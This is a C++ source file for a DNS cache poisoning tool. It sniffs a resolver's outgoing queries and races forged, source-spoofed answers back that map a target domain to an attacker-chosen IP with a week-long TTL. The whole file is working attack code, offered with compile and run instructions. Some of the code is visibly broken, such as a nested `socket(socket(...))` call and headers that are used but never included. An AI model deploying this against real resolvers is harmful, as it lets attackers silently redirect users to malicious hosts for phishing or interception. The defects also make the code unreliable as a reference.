// Compile: g++ -o race_poison race_poison.cpp -lpthread
// Run: sudo ./race_poison <upstream_dns> <recursive_resolver> <domain> <spoof_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <thread>
#include <atomic>
#include <chrono>

class RaceConditionPoison {
private:
    std::string upstreamDNS, resolverDNS, domain, spoofIP;
    std::atomic<bool> success{false};
    
    // Counts received queries from resolver to track timing
    std::atomic<uint64_t> queriesSeen{0};
    
    int encodeName(char* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            int len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        int len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
public:
    RaceConditionPoison(const std::string& upstream, 
                        const std::string& resolver,
                        const std::string& d, const std::string& spoof)
        : upstreamDNS(upstream), resolverDNS(resolver), 
          domain(d), spoofIP(spoof) {}
    
    // Sniff DNS queries from resolver to upstream - react INSTANTLY
    void sniffResolverQueries() {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if (sock < 0) return;
        
        char buffer[4096];
        
        while (!success.load()) {
            int bytes = recv(sock, buffer, sizeof(buffer), 0);
            if (bytes < 20) continue;
            
            struct iphdr* ip = (struct iphdr*)buffer;
            if (ip->protocol != IPPROTO_UDP) continue;
            
            int ipHeaderLen = ip->ihl * 4;
            
            // Check: resolver -> upstream
            if (ip->saddr != inet_addr(resolverDNS.c_str())) continue;
            if (ip->daddr != inet_addr(upstreamDNS.c_str())) continue;
            
            struct udphdr* udp = (struct udphdr*)(buffer + ipHeaderLen);
            if (ntohs(udp->dest) != 53) continue;
            
            char* dns = buffer + ipHeaderLen + sizeof(struct udphdr);
            
            // Extract TXID from the outgoing query
            uint16_t txid = ntohs(*(uint16_t*)(dns + 0));
            uint16_t srcPort = ntohs(udp->source);
            
            queriesSeen++;
            
            // INSTANTLY send forged response back to resolver
            // Racing against the real upstream response
            std::thread([this, txid, srcPort]() {
                sendRacingResponse(txid, srcPort);
            }).detach();
        }
        
        close(sock);
    }
    
    void sendRacingResponse(uint16_t txid, uint16_t dstPort) {
        int sock = socket(socket(AF_INET, SOCK_RAW, IPPROTO_UDP));
        
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        
        char packet[512];
        memset(packet, 0, sizeof(packet));
        
        struct iphdr* ip = (struct iphdr*)packet;
        struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct iphdr));
        char* dns = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
        
        *(uint16_t*)(dns + 0) = htons(txid);
        *(uint16_t*)(dns + 2) = htons(0x8180);
        *(uint16_t*)(dns + 4) = htons(1);
        *(uint16_t*)(dns + 6) = htons(1);
        
        int pos = 12;
        pos += encodeName(dns + pos, domain);
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        
        *(uint16_t*)(dns + pos) = htons(0xC00C); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;
        *(uint16_t*)(dns + pos) = htons(4); pos += 2;
        struct in_addr addr;
        inet_aton(spoofIP.c_str(), &addr);
        memcpy(dns + pos, &addr.s_addr, 4); pos += 4;
        
        udp->source = htons(53);
        udp->dest = htons(dstPort);
        udp->len = htons(sizeof(struct udphdr) + pos);
        udp->check = 0;
        
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + pos;
        ip->ttl = 64;
        ip->protocol = IPPROTO_UDP;
        // Source spoofed as upstream DNS server
        ip->saddr = inet_addr(upstreamDNS.c_str());
        ip->daddr = inet_addr(resolverDNS.c_str());
        ip->check = 0;
        
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(dstPort);
        dest.sin_addr.s_addr = inet_addr(resolverDNS.c_str());
        
        sendto(sock, packet, ip->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest));
        close(sock);
    }
    
    void run() {
        std::cout << "[*] Race condition poisoning\n";
        std::cout << "[*] Resolver: " << resolverDNS << "\n";
        std::cout << "[*] Upstream: " << upstreamDNS << "\n";
        std::cout << "[*] Sniffing for 60 seconds...\n";
        
        std::vector<std::thread> sniffers;
        for (int i = 0; i < 4; i++) {
            sniffers.emplace_back([this]() { sniffResolverQueries(); });
        }
        
        std::this_thread::sleep_for(std::chrono::seconds(60));
        success = true;
        
        for (auto& t : sniffers) t.join();
        
        std::cout << "[*] Total queries intercepted: " << queriesSeen.load() << "\n";
    }
};

int main(int argc, char* argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: " << argv[0] 
                  << " <upstream_dns> <recursive_resolver> <domain> <spoof_ip>\n";
        return 1;
    }
    srand(time(NULL));
    RaceConditionPoison poison(argv[1], argv[2], argv[3], argv[4]);
    poison.run();
    return 0;
}
